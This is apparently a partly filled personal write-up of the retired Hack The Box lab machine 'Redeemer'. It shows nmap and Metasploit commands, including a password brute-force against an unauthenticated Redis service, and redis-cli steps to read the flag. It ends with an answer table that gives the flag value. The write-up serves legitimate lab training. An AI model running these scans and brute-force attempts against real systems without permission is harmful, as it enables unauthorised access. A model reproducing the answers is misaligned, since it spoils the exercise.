---
title: Redeemer
date: 2026-06-27 19:58
description:
platform: HTB
categories:
  - Machines
status:
  - Retired
os:
  - Linux
difficulty:
  - Very Easy
image: ./attachments/Redeemer.png
tags:
finished: false
completed: false
---
# Synopsis

<img src="./attachments/Redeemer.png" width="100" height="100">

| Machine    |     |
| ---------- | --- |
| OS         |     |
| Difficulty |     |
| Released   |     |
| Created by |     |
| CVE        |     |

>[!summary]
>- Step 1
>- Step 2
## Improved skills

- Redis Enumeration
## Used tools

- rustscan / nmap 
- metsploit-framework 
- redis-cli
---
# Commands & Payloads

## Reconnaissance

```sh
 sudo nmap -sCV -Pn --vvv -p 6379 -oN  recon/deep_scan $TARGET
```

-  Redis key-value store 5.0.7 - 6379/tcp 
## Enumeration

### Redis (TCP/6379)

```sh
msf6 > use auxiliary/scanner/redis/redis_server
msf6 auxiliary(scanner/redis/redis_server) > set RHOSTS 10.129.98.204
msf6 auxiliary(scanner/redis/redis_server) > set THREADS 10
msf6 auxiliary(scanner/redis/redis_server) > run
```
## Exploitation

```sh
msf6 > use auxiliary/scanner/redis/redis_login
msf6 auxiliary(scanner/redis/redis_login) > set RHOSTS 10.129.98.204
msf6 auxiliary(scanner/redis/redis_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/redis/redis_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/redis/redis_login) > run
```

>  No password is required.


```sh
redis-cli -h 10.129.98.204
KEYS *
get flag
```

## Lateral Movement

### Local enumeration

### Lateral movement vector


## Privilege Escalation

### Local enumeration
### Privilege Escalation vector
---
# Resources

- 
- 

## External Writeup 

`<iframe width="660" height="415" src="https://www.youtube.com/embed/XXXXXX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`

- Ippsec 
- 0xdf
---
# Trophies


- [x] **root.txt**


| Task | Question                                                                                                                                              | Answer                             |
| ---- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------- |
| 1    | Which TCP port is open on the machine?                                                                                                                | 6379                               |
| 2    | Which service is running on the port that is open on the machine?                                                                                     | redis                              |
| 3    | What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database                                  | In-memory Database                 |
| 4    | Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. | redis-cli                          |
| 5    | Which flag is used with the Redis command-line utility to specify the hostname?                                                                       | -h                                 |
| 6    | Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?                              | info                               |
| 7    | What is the version of the Redis server being used on the target machine?                                                                             | 5.0.7                              |
| 8    | Which command is used to select the desired database in Redis?                                                                                        | select                             |
| 9    | How many keys are present inside the database with index 0?                                                                                           | 4                                  |
| 10   | Which command is used to obtain all the keys in a database?                                                                                           | keys *                             |
| 11   | Submit the flag located in the database.                                                                                                              | `03e1d2b376c37ab3f5319922053953eb` |

---
# Proof 

![](<./attachments/Redeemer-1.png>)

---
# Conclusion

---

# Table of Content 

%% Begin Waypoint %%
- [00-Pre-Engagement](<./00-Pre-Engagement.md>)
- [01-Reconnaissance](<./01-Reconnaissance.md>)
- [02.1-Enumeration](<./02.1-Enumeration.md>)
- [02.2-Vulnerability-Analysis](<./02.2-Vulnerability-Analysis.md>)
- [03-Exploitation](<./03-Exploitation.md>)
- [04.1-Lateral-Movement](<./04.1-Lateral-Movement.md>)
- [04.2-Privilege-Escalation](<./04.2-Privilege-Escalation.md>)
- [05-Post-Exploitation](<./05-Post-Exploitation.md>)
- [06-Remediation](<./06-Remediation.md>)

%% End Waypoint %%


---
